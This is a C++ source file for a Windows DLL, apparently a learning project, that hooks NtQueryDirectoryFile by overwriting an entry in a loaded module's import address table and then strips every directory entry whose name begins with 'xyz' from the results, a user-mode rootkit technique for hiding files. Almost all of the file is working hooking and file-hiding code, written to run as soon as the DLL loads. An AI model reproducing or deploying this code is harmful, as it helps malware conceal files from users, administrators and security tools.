#define _CET_SECURE_NO_WARNINGS
#include "dllmain.h"
#include <Windows.h>
#include "imagehlp.h"
#include <string.h>
#include <Winternl.h>
#include <fileapi.h>
#include <iostream>
#include <fstream>

using namespace std;

ofstream myfile; //logger
originalFuncPtr sourceFunc;
convertFuncPtr stringsConvertionfunc;

NTSTATUS NTAPI myFunc( //function to insert insted of target func
	HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry,
	PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
	myfile << "IN myFunc..." << endl;
	ANSI_STRING as;
	NTSTATUS status = sourceFunc(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	
	PFILE_ID_BOTH_DIR_INFORMATION currentPFileIdFullDirInfo;
	//myfile << "stringsConvertionfunc = " << stringsConvertionfunc << endl;
	switch (FileInformationClass) {
	case 37: //FileIdBothDirectoryInformation
		currentPFileIdFullDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		//find next file:
		PFILE_ID_BOTH_DIR_INFORMATION nextPFileIdFullDirInfo =
			(PFILE_ID_BOTH_DIR_INFORMATION)((LPBYTE)currentPFileIdFullDirInfo + currentPFileIdFullDirInfo->NextEntryOffset);

		while (currentPFileIdFullDirInfo->NextEntryOffset) { //while nextFile is exist
			//extract file name & size:
			UNICODE_STRING EntryName;
			EntryName.MaximumLength = EntryName.Length = (USHORT)nextPFileIdFullDirInfo->FileNameLength;
			EntryName.Buffer = &nextPFileIdFullDirInfo->FileName[0];
			stringsConvertionfunc(&as, &EntryName, TRUE);
			int size = as.Length;
			string name = as.Buffer;
			myfile << "name: " << name << " size: " << size << endl;
			
			//Hide xyz files:
			if (name.find("xyz") == 0) // do current->next = next->next (hide next)
			{
				myfile << "file: " << name << "Starts with xyz !!!"<< endl;
				myfile << "entry: " << currentPFileIdFullDirInfo->NextEntryOffset << "changed to entry: " << nextPFileIdFullDirInfo->NextEntryOffset << endl;
				
				//in case "xyz" is thr last file:
				if (nextPFileIdFullDirInfo->NextEntryOffset == 0)
				{
					currentPFileIdFullDirInfo->NextEntryOffset = 0; //set the current file to be the last file
					break;
				}

				currentPFileIdFullDirInfo->NextEntryOffset += nextPFileIdFullDirInfo->NextEntryOffset; //cur->next = nextfile->next (ignore nextfile)
				nextPFileIdFullDirInfo = //next file++
					(PFILE_ID_BOTH_DIR_INFORMATION)((LPBYTE)nextPFileIdFullDirInfo + nextPFileIdFullDirInfo->NextEntryOffset);

			} else { //next file is not xyz
				currentPFileIdFullDirInfo =  nextPFileIdFullDirInfo;//current file++
				if (nextPFileIdFullDirInfo->NextEntryOffset == 0) break; //no more files
				nextPFileIdFullDirInfo = //next file++
					(PFILE_ID_BOTH_DIR_INFORMATION)((LPBYTE)nextPFileIdFullDirInfo + nextPFileIdFullDirInfo->NextEntryOffset);
			}
		}
		break;
	}
	myfile << "OUT myFunc..." << endl;
	return status;
}

//Thi function returns the Import table of a handle
PIMAGE_IMPORT_DESCRIPTOR getImportTable(HMODULE hInstance)
{
	PIMAGE_DOS_HEADER dosHeader;
	IMAGE_OPTIONAL_HEADER optionalHeader;
	PIMAGE_NT_HEADERS ntHeader;
	IMAGE_DATA_DIRECTORY dataDirectory;
	
	dosHeader = (PIMAGE_DOS_HEADER)hInstance;//cast hInstance to (IMAGE_DOS_HEADER *) - the MZ Header
	ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);//The PE Header begin after the MZ Header (which has size of e_lfanew)
	optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader); //Getting OptionalHeader
	dataDirectory = (IMAGE_DATA_DIRECTORY)(optionalHeader.DataDirectory[1]);//Getting the import table of DataDirectory
	return (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hInstance + dataDirectory.VirtualAddress);//ImageBase+RVA to import table

}

int hookEATwithName(const char* modName, const char* targetName, DWORD64 hookFunc)
{
	myfile.open(LOG_FILENAME);
	myfile << "Starting.." << endl;
	//sourceFunc = (originalFuncPtr)GetProcAddress(GetModuleHandleW(L"windows.storage.dll"), "NtQueryDirectoryFile");
	//myfile << "Original NtQueryDirectoryFile is in " << sourceFunc << endl;
	HMODULE hMod = GetModuleHandleA(modName);  // NTDLII handle
	PIMAGE_IMPORT_DESCRIPTOR importedModuleIAT = getImportTable(hMod); //GET iat of NTDLII.DLL
	PIMAGE_THUNK_DATA originalFirstThunk; // Relative address (RVA) of the Import lookup table (ILT)
	PIMAGE_THUNK_DATA firstThunk; // Relative address (RVA) of the Import ADDRESS table (IAT)
	PIMAGE_IMPORT_BY_NAME importByName; //represent a function from the IAT.
	LPCSTR importName;
	bool isHooked = false;

	while (importedModuleIAT->OriginalFirstThunk) // for all dlls
	{
		//get IAT & ILT Addresses:
		originalFirstThunk = (PIMAGE_THUNK_DATA)importedModuleIAT->OriginalFirstThunk; 
		originalFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)originalFirstThunk + (UINT_PTR)hMod);
		firstThunk = (PIMAGE_THUNK_DATA)importedModuleIAT->FirstThunk;
		firstThunk = (PIMAGE_THUNK_DATA)((BYTE*)firstThunk + (UINT_PTR)hMod);

		while (*(WORD*)firstThunk != 0 && *(WORD*)originalFirstThunk != 0) { // for all functions
			//get function name:
			importByName = (PIMAGE_IMPORT_BY_NAME)originalFirstThunk->u1.AddressOfData;
			importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)importByName + ((UINT_PTR)hMod));
			importName = (LPCSTR)((BYTE*)importByName + sizeof(WORD));
			//myfile << i << ". imported Name =" << importName << endl;
			if (strcmp(importName, targetName) == 0) { //if func == target function
				myfile << "hooking" << endl;
				myfile << "Original NtQueryDirectoryFile is in " << sourceFunc << endl;
				DWORD oldProtectionFlags;
				//rewrite function
				VirtualProtect(&firstThunk->u1.Function, sizeof(LPVOID), PAGE_EXECUTE_READWRITE, &oldProtectionFlags);
				firstThunk->u1.Function = hookFunc;
				VirtualProtect(&firstThunk->u1.Function, sizeof(LPVOID), oldProtectionFlags, NULL);
				isHooked = true;
				myfile << "hooked successfully" << endl;
				break;
			}
			originalFirstThunk++; //func++
			firstThunk++; 
		}
		if (isHooked) break;
		importedModuleIAT++; //next dll
	}
	myfile << "IAT hooking finished" << endl;

	return TRUE;
}


BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
	char target[] = TARGET_DLL;
	char target_func[] = TARGET_FUNCTION;
	std::cout << "DLL LOADED  !!!! -----------" << endl;
	//Save address of original NtQueryDirectoryFile:
	sourceFunc = (originalFuncPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryDirectoryFile");
	//Save address of original RtlUnicodeStringToAnsiString:
	stringsConvertionfunc = (convertFuncPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlUnicodeStringToAnsiString");
	myfile << "Main ---> Original NtQueryDirectoryFile is in " << sourceFunc << endl;
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		hookEATwithName(target, target_func, (DWORD64)myFunc);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return true;
}